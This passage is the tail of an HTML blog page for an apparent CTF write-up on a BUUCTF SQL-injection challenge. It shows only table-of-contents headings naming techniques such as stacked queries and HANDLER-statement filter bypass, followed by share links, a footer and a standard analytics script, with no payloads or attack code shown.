确认SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 检测过滤关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. 堆叠查询探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. 查看表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%96%91%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. 查看可疑表的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4%E8%8E%B7%E5%8F%96flag"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 绕过select过滤获取flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%951%EF%BC%9A%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">尝试1：预处理语句（失败）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%952%EF%BC%9A%E9%87%8D%E5%91%BD%E5%90%8D%E8%A1%A8%EF%BC%88%E5%A4%87%E9%80%89%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">尝试2：重命名表（备选方案）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%953%EF%BC%9Ahandler%E8%AF%AD%E5%8F%A5%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%81%EF%BC%89"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">尝试3：handler语句（成功！）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">知识点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%EF%BC%88Stacked-Queries%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 堆叠查询（Stacked Queries）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL-MariaDB-%E7%89%B9%E6%AE%8A%E8%A1%A8%E5%90%8D%E5%A4%84%E7%90%86"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. MySQL&#x2F;MariaDB 特殊表名处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Handler%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. Handler语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.4.4.</span> <span class="toc-text">4. 常用绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%A1%A8%E9%87%8D%E5%91%BD%E5%90%8D%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.5.</span> <span class="toc-text">5. 表重命名攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4Payload"><span class="toc-number">1.5.</span> <span class="toc-text">完整Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%90%AF%E7%A4%BA"><span class="toc-number">1.6.</span> <span class="toc-text">题目启示</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&text=4-sql注入-随便注"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&is_video=false&description=4-sql注入-随便注"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=4-sql注入-随便注&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&title=4-sql注入-随便注"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/4-sql%E6%B3%A8%E5%85%A5-%E9%9A%8F%E4%BE%BF%E6%B3%A8/&name=4-sql注入-随便注&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 zhaochoudecat
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
